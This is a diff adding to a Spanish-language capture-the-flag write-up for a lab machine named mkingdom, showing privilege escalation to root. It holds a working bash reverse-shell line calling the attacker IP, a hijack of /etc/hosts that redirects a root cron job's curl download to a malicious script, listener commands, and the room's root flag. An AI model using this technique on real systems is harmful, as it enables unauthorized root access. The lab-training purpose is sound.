@@ -422,5 +422,110 @@ Saving to: ‘linpeas.sh’
 2026-07-01 12:05:13 (2.07 MB/s) - ‘linpeas.sh’ saved [1065387/1065387]
 
 
+le dare permisos de ejecucion :
+
+
+mario@mkingdom:/tmp$ chmod +x linpeas.sh
+chmod +x linpeas.sh
+mario@mkingdom:/tmp$ sh linpeas.sh
+
+
+hallazgo de linpeas : 
+
+el archivo/etc/hosts/ es modificable, tiene permisos de escritura
+
+mario@mkingdom:/tmp$ cat /etc/hosts
+cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       mkingdom.thm
+127.0.0.1       backgroundimages.concrete5.org
+127.0.0.1       www.concrete5.org
+127.0.0.1       newsflow.concrete5.org
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+intente buscar mas respuestas de linpeas, pero no daba mas informacion, busque en internet y en este caso puede usar una herramienta llamda para ver que esta eejcutando el sistema en tiempo real, la herramietnta encontro los procesos : 
+
+2026/07/01 12:26:01 CMD: UID=0     PID=20470  | curl mkingdom.thm:85/app/castle/application/counter.sh 
+2026/07/01 12:26:01 CMD: UID=0     PID=20469  | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter
+
+
+al abrirlo en el navegador, dice :
+
+!/bin/bash
+echo "There are $(ls -laR /var/www/html/app/castle/ | wc -l) folder and files in TheCastleApp in - - - - > $(date)."
+
+
+en etc/hosts , en vez la ip de localhost , puse la ip del ataante
+
+luego recree el directorio donde esta el script en mi home 
+
+[davidoberst@archlinux application]$ pwd
+/home/davidoberst/app/castle/application
+[davidoberst@archlinux application]$ 
+
+luego dentro de esa ruta, creo counter.sh, pero agregando un script de una rs
+
+echo -e '#!/bin/bash\nbash -i >& /dev/tcp/192.168.138.111/4444 0>&1' > counter.sh
+
+
+luego un oyente para ejecutar la rs
+
+[davidoberst@archlinux ~]$ sudo python3 -m http.server 85
+[sudo] password for davidoberst: 
+Serving HTTP on 0.0.0.0 port 85 (http://0.0.0.0:85/) ...
+
+
+
+
+luego de un tiempo la rs se ejecuto 
+
+[davidoberst@archlinux ~]$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 
+bash: cannot set terminal process group (21382): Inappropriate ioctl for device
+bash: no job control in this shell
+root@mkingdom:~# whoami
+whoami
+root
+root@mkingdom:~# 
+
+
+root@mkingdom:~# cat root.txt
+cat root.txt
+cat: root.txt: Permission denied
+root@mkingdom:~# 
+
+
+la bandera no tiene permisos, la pasare a tmp 
+
+
+root@mkingdom:~# cp root.txt /tmp
+cp root.txt /tmp
+root@mkingdom:~# cd /tmp
+cd /tmp
+root@mkingdom:/tmp# ls
+ls
+linpeas.sh
+pspy64
+root.txt
+
+
+aqui esta la bandera!
+
+root@mkingdom:/tmp# cat root.txt
+cat root.txt
+thm{e8b2f52d88b9930503cc16ef48775df0}
+root@mkingdom:/tmp# 
+
+
+
+
+
 
 
